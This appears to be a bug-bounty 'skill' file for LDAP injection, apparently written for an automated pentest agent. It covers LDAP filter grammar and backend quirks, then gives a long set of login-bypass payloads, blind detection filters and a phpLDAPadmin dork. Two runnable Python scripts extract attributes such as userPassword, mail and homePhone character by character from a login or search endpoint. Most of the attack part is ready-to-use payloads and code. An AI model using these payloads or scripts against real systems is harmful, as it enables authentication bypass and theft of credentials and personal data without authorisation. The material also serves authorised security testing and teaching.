---
name: "ldap-injection"
version: "2.0"
category: "injection"
subcategory: "ldap"
phase: "exploitation"
tags: ["bug-bounty", "injection", "ldap", "authentication-bypass", "directory-services"]
tools: ["burp-intruder", "jxplorer"]
follow_up_skills: ["command-injection", "rce", "remote-code-execution", "information-disclosure-harvesting"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: ldap injection - exploitation phase, injection category"
---
# LDAP Injection

## Summary

LDAP injection targets web applications that construct LDAP statements from user input without proper sanitization. Attackers can manipulate LDAP filters to bypass authentication, enumerate attributes, or extract data.

## Key Concepts

### LDAP Filter Grammar

```bnf
filter        = (filtercomp)
filtercomp    = and / or / not / item
and           = & filterlist
or            = | filterlist
not           = ! filter
filterlist    = 1*filter
item          = simple / present / substring
simple        = attr filtertype assertionvalue
filtertype    = '=' / '~=' / '>=' / '<='
present       = attr = *
substring     = attr "=" [initial] * [final]
initial       = assertionvalue
final         = assertionvalue
```

**Special filters:**
- `(&)` = absolute TRUE
- `(|)` = absolute FALSE

### Backend-Specific Behavior

- **OpenLDAP**: Only the first filter is executed if multiple reach the server
- **ADAM / Microsoft LDS**: Throws an error on multiple filters
- **SunOne Directory Server 5.0**: Executes both filters

Always send syntactically correct filters — malformed filters throw errors. Filters must start with `&` or `|`.

## Login Bypass

LDAP supports multiple password storage formats (plaintext, md5, smd5, sha, crypt, ssha). Input may be hashed before comparison.

### Basic Wildcard Bypass

```
user=*
password=*
→ (&(user=*)(password=*))
```

### Injecting a Closing Filter

```
user=*)(&
password=*)(&
→ (&(user=*)(&)(password=*)(&))
```

### Using OR to Neutralize the Password Check

```
user=*)(|(&
pass=pwd)
→ (&(user=*)(|(&)(pass=pwd))
```

### Password Field OR Injection

```
user=*)(|(password=*
password=test)
→ (&(user=*)(|(password=*)(password=test))
```

### Null Byte Termination

```
user=*))%00
pass=any
→ (&(user=*))%00 → query terminates at %00, password check ignored
```

### Admin + AND Chaining

```
user=admin)(&)
password=pwd
→ (&(user=admin)(&))(password=pwd) → may throw error but can bypass
```

### Admin + NOT + FALSE OR

```
username = admin)(!(&(|
pass = any))
→ (&(uid=admin)(!(&(|)(webpassword=any))))
→ (|) is FALSE, so password check evaluates to True
```

### Trailing AND

```
username=*
password=*)(&
→ (&(user=*)(password=*)(&))
```

### Admin + OR Injection

```
username=admin))(|(|
password=any
→ (&(uid=admin))(|(|)(webpassword=any))
```

## Blind LDAP Injection

Force TRUE or FALSE responses to confirm injection:

```bash
# TRUE — data returned
Payload: *)(objectClass=*))(&objectClass=void
Query:   (&(objectClass=*)(objectClass=*))(&objectClass=void)(type=Pepi*))

# FALSE — no data returned
Payload: void)(objectClass=void))(&objectClass=void
Query:   (&(objectClass=void)(objectClass=void))(&objectClass=void)(type=Pepi*))
```

### Data Extraction via Iterative Brute-Force

Iterate over ASCII characters to guess attribute values character-by-character:

```bash
(&(sn=administrator)(password=*))    → OK (value starts with something)
(&(sn=administrator)(password=A*))   → KO
(&(sn=administrator)(password=B*))   → KO
...
(&(sn=administrator)(password=M*))   → OK (first char is M)
(&(sn=administrator)(password=MA*))  → KO
(&(sn=administrator)(password=MB*))  → KO
...
```

## Methodology

1. Identify parameters used in LDAP queries (login forms, search fields, user lookups).
2. Test with `*` wildcard — if `*` returns all results, LDAP injection is likely.
3. Try login bypass payloads against authentication endpoints.
4. Test for blind injection with TRUE/FALSE filters.
5. Extract data using iterative character brute-force on known attributes.
6. Brute-force attribute names to discover hidden fields.

## Payloads

```
# Login Bypasses
*)(&
*)(|(&
*)(|(password=*
*))%00
admin)(&)
admin)(!(&(|
admin))(|(|
*)(objectClass=*))(&objectClass=void

# Blind Detection - True
*)(objectClass=*))(&objectClass=void
# Blind Detection - False
void)(objectClass=void))(&objectClass=void

# Google Dork for phpLDAPadmin
intitle:"phpLDAPadmin" inurl:cmd.php
```

## Commands

### Python Script — Extract LDAP Attributes (Blind)

```python
import requests
import string

url = "http://target.com/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["cn", "givenName", "sn", "uid", "mail", "userPassword",
              "password", "homePhone", "mobile", "facsimileTelephoneNumber",
              "pager", "street", "l", "st", "postalCode", "description"]

for attribute in attributes:
    value = ""
    finish = False
    while not finish:
        for char in alphabet:
            query = f"*)({attribute}={value}{char}*"
            data = {'login': query, 'password': 'bla'}
            r = requests.post(url, data=data)
            if "Cannot login" not in r.text:
                value += str(char)
                print(f"[+] {attribute}: {value}")
                break
            if char == alphabet[-1]:
                finish = True
```

### Python Script — Blind LDAP (No Wildcard)

```python
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    for char in alphabet:
        r = requests.get("http://target.com/?search=admin*)(password=" + flag + char)
        if "TRUE_CONDITION" in r.text:
            flag += char
            print(f"[+] Flag: {flag}")
            break
```

## Tools

- **LDAP Browser** — Visual LDAP exploration
- **JXplorer** — LDAP browser and editor
- **Burp Suite** — Manual injection, Intruder for brute-force
- **PayloadsAllTheThings** — LDAP injection payload lists

## Bypass Techniques

- **`*` wildcard**: Matches any value — use in place of known credentials
- **`%00` null byte**: Terminates LDAP query string in some backends
- **Nested filter chaining**: Use `)(&` or `)(|(` to inject additional filter terms
- **Attribute brute-force**: LDAP objects have many default attributes — discover and extract hidden data

## Notes

- LDAP injection is most common in legacy enterprise apps (VPN portals, employee directories, authentication gateways)
- Always test `*` wildcard in username/password fields — if it returns success, the app is vulnerable
- The password may be hashed server-side before comparison — blind extraction techniques still work
- phpLDAPadmin is a common admin interface; finding it via Google dorking often leads to LDAP-exposed instances
- A comprehensive list of LDAP attributes for brute-forcing is available in PayloadsAllTheThings

## References

- https://hacktricks.xsx.tw/pentesting-web/ldap-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
- https://www.blackhat.com/presentations/bh-europe-08/Alonso-Paralta/Whitepaper/bh-eu-08-alonso-paralta-WP.pdf
- https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt
- https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt
- https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html
